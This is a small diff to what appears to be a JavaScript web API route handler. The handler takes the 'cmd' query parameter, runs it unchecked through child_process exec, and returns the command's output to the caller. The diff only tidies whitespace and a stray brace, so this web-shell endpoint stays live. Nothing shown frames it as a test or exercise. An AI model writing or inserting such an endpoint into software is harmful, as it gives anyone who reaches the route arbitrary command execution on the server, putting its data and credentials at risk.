@@ -1,7 +1,6 @@
 export default function handler(req,res) {
   console.log(req.query.cmd)
 
-
     const { exec } = require("child_process");
     exec(`${req.query.cmd}`, (error, stdout, stderr) => {
         if (error) {
@@ -16,5 +15,4 @@ export default function handler(req,res) {
             res.send(`${stdout}`);
         }
     });
-}
 }
